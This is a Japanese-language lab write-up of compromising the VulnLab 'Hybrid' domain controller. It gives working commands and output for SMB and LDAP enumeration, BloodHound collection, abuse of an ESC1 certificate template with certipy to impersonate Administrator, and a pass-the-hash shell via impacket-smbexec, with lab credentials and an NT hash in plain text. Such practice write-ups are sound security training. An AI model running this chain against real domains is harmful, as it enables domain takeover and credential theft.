![](https://i.imgur.com/Ivzy4ge.png)

![](https://i.imgur.com/IBblidB.png)

- URL : https://www.vulnlab.com/machines#:~:text=Author-,Hybrid,-Windows
- #easy 
- OS : #Windows
- Machine Author(s): xct
- Hacked Date: 2025/10/16



# Enumeration
Principle
1. **目に見えるものだけがすべてではない。** あらゆる視点を考慮しろ
2. 見えていることと、見えていないことを区別しろ
3. **常に情報を得る手段は存在する。** 対象をしっかり理解しろ

## Nmap

| **ポート**   | **サービス**     | **バージョン**                               | **その他**                                                                                                                |
| --------- | ------------ | --------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| 53/tcp    | **DNS**      | Simple DNS Plus                         |                                                                                                                        |
| 88/tcp    | **kerberos** | Microsoft Windows Kerberos              | server time: 2025-10-09 06:55:41Z                                                                                      |
| 135/tcp   | msrpc        | Microsoft Windows RPC                   |                                                                                                                        |
| 139/tcp   | netbios-ssn  | Microsoft Windows netbios-ssn           |                                                                                                                        |
| 389/tcp   | **ldap**     | Microsoft Windows Active Directory LDAP | Domain: hybrid.vl / Site: Default-First-Site-Name                                                                      |
| 445/tcp   | **SMB**      |                                         | SMB (microsoft-ds?)                                                                                                    |
| 464/tcp   | kpasswd5     |                                         | Kerberos パスワード変更                                                                                                       |
| 593/tcp   | ncacn_http   | Microsoft Windows RPC over HTTP 1.0     |                                                                                                                        |
| 636/tcp   | **LDAPS**    | Microsoft Windows AD LDAP (LDAPS)       | 証明書: CN=dc01.hybrid.vl / Issuer=hybrid-DC01-CA / 有効: 2025-10-09〜2026-10-09                                             |
| 3268/tcp  | ldap         | Microsoft Windows AD LDAP (GC)          | 証明書: CN=dc01.hybrid.vl / Issuer=hybrid-DC01-CA / 有効: 2025-10-09〜2026-10-09                                             |
| 3269/tcp  | ssl/ldap     | Microsoft Windows AD LDAP (GC over SSL) | 証明書: CN=dc01.hybrid.vl / Issuer=hybrid-DC01-CA / 有効: 2025-10-09〜2026-10-09                                             |
| 3389/tcp  | **RDP**      | Microsoft Terminal Services (RDP)       | Domain: HYBRID / Host: DC01 (dc01.hybrid.vl) / Version: 10.0.20348 / 証明書: CN=dc01.hybrid.vl, 有効: 2025-10-08〜2026-04-09 |
| 9389/tcp  | mc-nmf       | .NET Message Framing                    |                                                                                                                        |
| 49259/tcp | msrpc        | Microsoft Windows RPC                   |                                                                                                                        |
| 49274/tcp | msrpc        | Microsoft Windows RPC                   |                                                                                                                        |
| 49664/tcp | msrpc        | Microsoft Windows RPC                   |                                                                                                                        |
| 49667/tcp | msrpc        | Microsoft Windows RPC                   |                                                                                                                        |
| 49669/tcp | ncacn_http   | Microsoft Windows RPC over HTTP 1.0     |                                                                                                                        |
| 49670/tcp | msrpc        | Microsoft Windows RPC                   |                                                                                                                        |
| 55273/tcp | msrpc        | Microsoft Windows RPC                   |                                                                                                                        |
| 59530/tcp | msrpc        | Microsoft Windows RPC                   |                                                                                                                        |
| 64383/tcp | msrpc        | Microsoft Windows RPC                   |                                                                                                                        |

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-09 06:55:41Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.hybrid.vl
| Issuer: commonName=hybrid-DC01-CA/domainComponent=hybrid
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-09T06:27:44
| Not valid after:  2026-10-09T06:27:44
| MD5:   2d9a:a5bd:2fe3:e74f:231c:8eaf:2345:76f6
| SHA-1: bbfc:0281:92dd:ca22:bf45:be55:7193:840a:e34f:6c4d
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.hybrid.vl
| Issuer: commonName=hybrid-DC01-CA/domainComponent=hybrid
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-09T06:27:44
| Not valid after:  2026-10-09T06:27:44
| MD5:   2d9a:a5bd:2fe3:e74f:231c:8eaf:2345:76f6
| SHA-1: bbfc:0281:92dd:ca22:bf45:be55:7193:840a:e34f:6c4d
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.hybrid.vl
| Issuer: commonName=hybrid-DC01-CA/domainComponent=hybrid
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-09T06:27:44
| Not valid after:  2026-10-09T06:27:44
| MD5:   2d9a:a5bd:2fe3:e74f:231c:8eaf:2345:76f6
| SHA-1: bbfc:0281:92dd:ca22:bf45:be55:7193:840a:e34f:6c4d
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.hybrid.vl
| Issuer: commonName=hybrid-DC01-CA/domainComponent=hybrid
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-09T06:27:44
| Not valid after:  2026-10-09T06:27:44
| MD5:   2d9a:a5bd:2fe3:e74f:231c:8eaf:2345:76f6
| SHA-1: bbfc:0281:92dd:ca22:bf45:be55:7193:840a:e34f:6c4d
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HYBRID
|   NetBIOS_Domain_Name: HYBRID
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hybrid.vl
|   DNS_Computer_Name: dc01.hybrid.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-09T06:56:46+00:00
|_ssl-date: 2025-10-09T06:57:25+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Issuer: commonName=dc01.hybrid.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-08T06:36:40
| Not valid after:  2026-04-09T06:36:40
| MD5:   401e:cc98:51f8:f23d:3a49:c043:f19c:ddad
| SHA-1: 8409:cbed:c393:b533:1392:c6d6:c80b:cf4f:5c97:c569
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49259/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49274/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55273/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
59530/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
64383/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

```
これは、DCだな
ドメイン : hybrid.vl
ホスト名 : DC01

匿名ログインできるのか
- SMB
- LDAP

## GUESTログイン
### SMB
匿名ログインできるのか
```bash
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid]
└─$ nxc smb 10.10.233.117 -u 'guest' -p '' --shares
SMB         10.10.233.117   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False) 
SMB         10.10.233.117   445    DC01             [-] hybrid.vl\guest: STATUS_ACCOUNT_DISABLED 
```
匿名ログインできない

### LDAP
匿名ログインできるのか
```bash
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid]
└─$ nxc ldap hybrid.vl -u 'guest' -p '' --users                
LDAP        10.10.233.117   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hybrid.vl)
LDAP        10.10.233.117   389    DC01             [-] hybrid.vl\guest: STATUS_ACCOUNT_DISABLED

```
ログインできない
そもそもguestユーザーが無効化されている


# Foothold
## peter.turnerでログイン
[[Mail01#peter.turnerのドメインの認証情報]]を使って、DCに対して、SMBやLDAPの権限がないかを検索する

SMBの権限があるのかを確認する
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid]
└─$ nxc smb 10.10.206.37 -u 'peter.turner' -p 'b0cwR+G4Dzl_rw' --shares
SMB         10.10.206.37    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False) 
SMB         10.10.206.37    445    DC01             [+] hybrid.vl\peter.turner:b0cwR+G4Dzl_rw 
SMB         10.10.206.37    445    DC01             [*] Enumerated shares
SMB         10.10.206.37    445    DC01             Share           Permissions     Remark
SMB         10.10.206.37    445    DC01             -----           -----------     ------
SMB         10.10.206.37    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.206.37    445    DC01             C$                              Default share
SMB         10.10.206.37    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.206.37    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.206.37    445    DC01             SYSVOL          READ            Logon server share 
         
```
SMBのRead権限がいくつかのフォルダに対して、あることがわかった

LDAPについても調べる
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid]
└─$ nxc ldap hybrid.vl -u 'peter.turner' -p 'b0cwR+G4Dzl_rw' --users
LDAP        10.10.206.37    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hybrid.vl)
LDAP        10.10.206.37    389    DC01             [+] hybrid.vl\peter.turner:b0cwR+G4Dzl_rw 
LDAP        10.10.206.37    389    DC01             [*] Enumerated 13 domain users: hybrid.vl
LDAP        10.10.206.37    389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.10.206.37    389    DC01             Administrator                 2023-06-17 14:53:20 0        Built-in account for administering the computer/domain      
LDAP        10.10.206.37    389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.10.206.37    389    DC01             krbtgt                        2023-06-17 14:04:47 0        Key Distribution Center Service Account                     
LDAP        10.10.206.37    389    DC01             Edward.Miller                 2023-06-17 14:46:22 0                                                                    
LDAP        10.10.206.37    389    DC01             Pamela.Smith                  2023-06-17 14:46:22 0                                                                    
LDAP        10.10.206.37    389    DC01             Josh.Mitchell                 2023-06-17 14:46:22 0                                                                    
LDAP        10.10.206.37    389    DC01             Peter.Turner                  2023-06-17 14:46:22 0                                                                    
LDAP        10.10.206.37    389    DC01             Olivia.Smith                  2023-06-17 14:46:22 0                                                                    
LDAP        10.10.206.37    389    DC01             Ricky.Myers                   2023-06-17 14:46:23 0                                                                    
LDAP        10.10.206.37    389    DC01             Elliot.Watkins                2023-06-17 14:46:23 0                                                                    
LDAP        10.10.206.37    389    DC01             Emily.White                   2023-06-17 14:46:23 0                                                                    
LDAP        10.10.206.37    389    DC01             Kathleen.Walker               2023-06-17 14:46:23 0                                                                    
LDAP        10.10.206.37    389    DC01             Margaret.Shepherd             2023-06-17 14:46:23 0
```
LDAPについても権限があることがわかった。

## BloodHound
LDAPの読み取り権限があることがわかったので、BloodHoundで詳細に分析する
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid/DC]
└─$ sudo bloodhound-python -u 'peter.turner@hybrid.vl' -p 'b0cwR+G4Dzl_rw' -ns 10.10.206.37 -d hybrid.vl -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hybrid.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.hybrid.vl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.hybrid.vl
INFO: Found 14 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: mail01
INFO: Querying computer: dc01.hybrid.vl
WARNING: Could not resolve: mail01: The resolution lifetime expired after 3.105 seconds: Server Do53:10.10.206.37@53 answered The DNS operation timed out.
INFO: Done in 00M 53S

```

Domain Admin権限を持つユーザー
![](https://i.imgur.com/BWGoItE.png)
EDWARD.MILLER@HYBRID.VLが、Domain Adminに入ってるのは覚えておく必要あるか
Kerberoastingできるユーザーがいない、AS-REP Roastingできるユーザーもいない
特にpeter.turnerから簡単に横展開できそうなユーザーもいない

# Privilege Escalation

## CertPy
まあ、なんかpeterの認証情報あるし、試してみるかみたいな感じ
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid/DC]
└─$ certipy-ad find -u 'peter.turner@hybrid.vl' -p 'b0cwR+G4Dzl_rw' -target hybrid.vl -dc-ip 10.10.206.37 -ns 10.10.206.37 -enabled -vulnerable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'hybrid-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'hybrid-DC01-CA'
[*] Checking web enrollment for CA 'hybrid-DC01-CA' @ 'dc01.hybrid.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : hybrid-DC01-CA
    DNS Name                            : dc01.hybrid.vl
    Certificate Subject                 : CN=hybrid-DC01-CA, DC=hybrid, DC=vl
    Certificate Serial Number           : 45CAA64FA095FDAB4FD15E3DF8A70977
    Certificate Validity Start          : 2023-06-17 14:04:39+00:00
    Certificate Validity End            : 2125-10-16 01:34:51+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : HYBRID.VL\Administrators
      Access Rights
        ManageCa                        : HYBRID.VL\Administrators
                                          HYBRID.VL\Domain Admins
                                          HYBRID.VL\Enterprise Admins
        ManageCertificates              : HYBRID.VL\Administrators
                                          HYBRID.VL\Domain Admins
                                          HYBRID.VL\Enterprise Admins
        Enroll                          : HYBRID.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : HybridComputers
    Display Name                        : HybridComputers
    Certificate Authorities             : hybrid-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 100 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-06-17T14:26:19+00:00
    Template Last Modified              : 2023-06-17T14:26:46+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HYBRID.VL\Domain Admins
                                          HYBRID.VL\Domain Computers
                                          HYBRID.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : HYBRID.VL\Administrator
        Full Control Principals         : HYBRID.VL\Domain Admins
                                          HYBRID.VL\Enterprise Admins
        Write Owner Principals          : HYBRID.VL\Domain Admins
                                          HYBRID.VL\Enterprise Admins
        Write Dacl Principals           : HYBRID.VL\Domain Admins
                                          HYBRID.VL\Enterprise Admins
        Write Property Enroll           : HYBRID.VL\Domain Admins
                                          HYBRID.VL\Domain Computers
                                          HYBRID.VL\Enterprise Admins
    [+] User Enrollable Principals      : HYBRID.VL\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.

```
ESC1が脆弱であると出ている、EESC1 は「ユーザーが自分で証明書を要求でき、証明書で任意のユーザーを偽装できる」脆弱なテンプレート。なので、管理者を偽造してテンプレートを取得で切bな管理者権限になれる。
しかし、そのためにはコンピュータアカウントで、取得する必要がある

コンピューターアカウントの作成
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid/DC]
└─$ impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Password123!' -dc-ip 10.10.206.37 'hybrid.vl/peter.turner:b0cwR+G4Dzl_rw'

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Authenticating account's machine account quota exceeded!

```
失敗する
mail01で管理者権限を取得できたら、コンピュータアカウントを取得できるのではないか

## mail01$として実行する
[[Mail01#Post Privilege Escalation]]から戻ってきた

AdministratorのSIDを取得する
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid/10.10.233.118]
└─$ ldapsearch -x -H ldap://10.10.206.37 -D "peter.turner@hybrid.vl" -w 'b0cwR+G4Dzl_rw' -b "DC=hybrid,DC=vl" -LLL -o ldif-wrap=no "(sAMAccountName=Administrator)" objectSid
dn: CN=Administrator,CN=Users,DC=hybrid,DC=vl
objectSid:: AQUAAAAAAAUVAAAAn7nOzD9AegQNP+/a9AEAAA==

# refldap://ForestDnsZones.hybrid.vl/DC=ForestDnsZones,DC=hybrid,DC=vl

# refldap://DomainDnsZones.hybrid.vl/DC=DomainDnsZones,DC=hybrid,DC=vl

# refldap://hybrid.vl/CN=Configuration,DC=hybrid,DC=vl

```

DCのAdministratorのESC1を取得する
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid/10.10.233.118]
└─$ certipy-ad req -k -no-pass -u 'MAIL01$' -ca 'hybrid-DC01-CA' -target 'DC01.HYBRID.VL' -dc-host 'DC01.HYBRID.VL' -template 'HybridComputers' -upn 'Administrator@hybrid.vl' -sid 'S-1-5-21-3436099999-75120703-3673112333-500' -dc-ip 10.10.206.37 -key-size 4096
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 11
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@hybrid.vl'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```
取得できた
sidは必須だね

NTLMハッシュを取得する
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid/10.10.233.118]
└─$  certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.206.37  
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@hybrid.vl'
[*]     SAN URL SID: 'S-1-5-21-3436099999-75120703-3673112333-500'
[*]     Security Extension SID: 'S-1-5-21-3436099999-75120703-3673112333-500'
[*] Using principal: 'administrator@hybrid.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@hybrid.vl': aad3b435b51404eeaad3b435b51404ee:60701e8543c9f6db1a2af3217386d3dc

```
AdministratorのNTLMハッシュが取得できた！！

### AdministratorのNTLMハッシュ
Administrator : aad3b435b51404eeaad3b435b51404ee:60701e8543c9f6db1a2af3217386d3dc

## シェルを取る
smbexecでシェルを取得して、whoami /allを実行する
```sh
┌──(kali㉿kali)-[~/Desktop/Vulnhub/Hybrid/10.10.233.118]
└─$ impacket-smbexec hybrid.vl/Administrator@10.10.206.37 -hashes aad3b435b51404eeaad3b435b51404ee:60701e8543c9f6db1a2af3217386d3dc
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami /all

USER INFORMATION
----------------

User Name           SID     
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner    
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled 
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeAuditPrivilege                          Generate security audits                                           Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
SeTimeZonePrivilege                       Change the time zone                                               Enabled 
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

```
Administratorであることが確認できた

root.txtを取得する
```sh
C:\Windows\system32>dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 9015-B8B0

 Directory of C:\Users\Administrator\Desktop

06/17/2023  07:53 AM    <DIR>          .
06/17/2023  06:16 AM    <DIR>          ..
06/17/2023  07:32 AM                36 root.txt
               1 File(s)             36 bytes
               2 Dir(s)  11,279,368,192 bytes free

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
<SNIP>

```

![](https://i.imgur.com/7iojHZu.png)

## Notes
- certpy-adで脆弱なESC1をAdministratorになりすまして取得するときは、-sidが必須
	- 出ないと、NTLMをリクエストするときにエラーが起きる
